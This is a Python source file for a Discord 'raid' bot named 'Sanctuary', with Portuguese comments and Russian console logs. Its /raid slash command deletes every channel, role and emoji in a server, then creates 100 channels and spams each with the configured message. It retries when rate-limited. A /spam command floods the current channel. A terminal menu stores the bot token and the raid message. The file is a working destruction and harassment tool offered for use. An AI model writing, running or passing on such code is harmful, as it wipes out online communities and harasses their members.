import discord
import asyncio
import random
import json
import os
import sys
import time
from discord.ext import commands
from discord import app_commands
from utils.interface import clear_screen, print_gradient_ascii, wait_enter, RED, WHITE, RESET

CONFIG_FILE = "config/settings.json"

def load_config():
    if not os.path.exists(CONFIG_FILE):
        return {"token": "", "message": " EDITE A MENSAGEM PARA MELHOR USO "}
    with open(CONFIG_FILE, "r", encoding="utf-8") as f:
        return json.load(f)

def save_config(config):
    if not os.path.exists("config"):
        os.makedirs("config")
    with open(CONFIG_FILE, "w", encoding="utf-8") as f:
        json.dump(config, f, indent=4, ensure_ascii=False)

# --- FUNÇÕES DE RAID (LOGS ESTRANHOS/RUSSO) ---

async def ultra_raid(g: discord.Guild, msg_content):
    print(f"\n{RED}ЗАПУСК РЕЙДА🩸{RESET}") 
    
    await asyncio.gather(
        *[c.delete() for c in g.channels],
        *[r.delete() for r in g.roles if not r.is_default()],
        *[e.delete() for e in g.emojis],
        return_exceptions=True
    )

    async def create_and_spam(index):
        try:
            ch = await g.create_text_channel("sanctuary-anti-panela🖕🏼")
            # Log de canal criado
            print(f"{RED}[+]{WHITE} КАНАЛ {index} СОЗДАН.") 
            
            for m_index in range(1, 61):
                try:
                    await ch.send(msg_content)
                    # Log de mensagem enviada no canal específico
                    if m_index % 10 == 0:
                        print(f"{RED}[*]{WHITE} СООБЩЕНИЕ {m_index} ОТПРАВЛЕНО В КАНАЛ {index}")
                    await asyncio.sleep(0.2) 
                except:
                    break
        except discord.HTTPException as e:
            if e.status == 429:
                await asyncio.sleep(3)

    for i in range(1, 101):
        asyncio.create_task(create_and_spam(i))
        await asyncio.sleep(0.4)

async def start_bot(token, raid_msg):
    intents = discord.Intents.all()
    bot = commands.Bot(command_prefix="!!", intents=intents)

    @bot.event
    async def on_ready():
        await bot.tree.sync()
        clear_screen()
        print_gradient_ascii()
        # Alteração solicitada por você:
        print(f"{RED}BOT INICIADO👁️{RESET}")
        print(f"{WHITE}Sessão: {RED}{bot.user.name}{RESET}")
        print(f"{WHITE}ID: {RED}{bot.user.id}{RESET}")
        # Alteração solicitada por você:
        print(f"\n{WHITE}Aguardando comando /raid /spam{RESET}")

    @bot.tree.command(name="raid", description="Executar Raid")
    async def raid(interaction: discord.Interaction):
        await interaction.response.send_message("🩸 Atacando...", ephemeral=True)
        await ultra_raid(interaction.guild, raid_msg)

    @bot.tree.command(name="spam", description="Spam rápido")
    async def spam(interaction: discord.Interaction):
        await interaction.response.send_message("Spam iniciado.", ephemeral=True)
        print(f"\n{RED}РУЧНОЙ СПАМ🩸{RESET}") # Spam Manual
        for i in range(1, 101):
            try: 
                await interaction.channel.send(raid_msg)
                if i % 20 == 0:
                    print(f"{RED}[*]{WHITE} {i} СООБЩЕНИЙ ОТПРАВЛЕНО")
                await asyncio.sleep(0.1)
            except: 
                break

    try:
        await bot.start(token)
    except Exception as e:
        print(f"{RED}[Erro]{WHITE} {e}"); wait_enter()

# --- INTERFACE ---

def show_files():
    clear_screen(); print_gradient_ascii()
    print(f"{RED}--- Arquivos ---{RESET}\n")
    for root, _, files in os.walk("."):
        for f in files: print(f"{RED}[F]{WHITE} {f}")
    wait_enter()

def show_info():
    clear_screen(); print_gradient_ascii()
    print(f"{RED}--- Informações Gerais ---{RESET}")
    print(f"{WHITE}Painel: {RED}v1.0 Sanctuary{RESET}")
    print(f"{WHITE}Desenvolvedor: {RED}Y6{RESET}")
    print(f"{WHITE}Discord Oficial: {RED}https://discord.gg/eauHuCd3h/{RESET}")
    wait_enter()

def main_menu():
    while True:
        config = load_config()
        clear_screen(); print_gradient_ascii()
        
        print(f"{RED}[1] {WHITE}Iniciar Bot")
        print(f"{RED}[2] {WHITE}Editar Token")
        print(f"{RED}[3] {WHITE}Editar Mensagem")
        print(f"{RED}[4] {WHITE}Informações")
        print(f"{RED}[5] {WHITE}Arquivos")
        print(f"{RED}[6] {WHITE}Sair")
        
        choice = input(f"\n{RED}Opção: {RESET}")
        
        if choice == "1":
            tkn = config.get("token", "").strip()
            msg = config.get("message", "").strip()
            
            if not tkn or not msg:
                print(f"{RED}Erro: Token ou Mensagem não configurados!{RESET}")
                wait_enter()
                continue
                
            loop = asyncio.new_event_loop()
            asyncio.set_event_loop(loop)
            try: loop.run_until_complete(start_bot(tkn, msg))
            except KeyboardInterrupt: pass
            finally: loop.close()

        elif choice == "2":
            new_token = input(f"\n{RED}Digite o novo Token: {RESET}").strip()
            if not new_token:
                print(f"{RED}Erro ao colocar o token: o campo não pode estar vazio!{RESET}")
                wait_enter()
            else:
                config["token"] = new_token
                save_config(config)
                print(f"{RED}[SUCESSO]{WHITE} Token atualizado e salvo!")
                wait_enter()

        elif choice == "3":
            new_msg = input(f"\n{RED}Digite a nova Mensagem: {RESET}").strip()
            if not new_msg:
                print(f"{RED}Erro ao colocar a mensagem: o campo não pode estar vazio!{RESET}")
                wait_enter()
            else:
                config["message"] = new_msg
                save_config(config)
                print(f"{RED}[SUCESSO]{WHITE} Mensagem de raid configurada!")
                wait_enter()

        elif choice == "4": show_info()
        elif choice == "5": show_files()
        elif choice == "6":
            print(f"\n{RED}Saindo...{RESET}")
            time.sleep(4)
            sys.exit()

if __name__ == "__main__":
    main_menu()

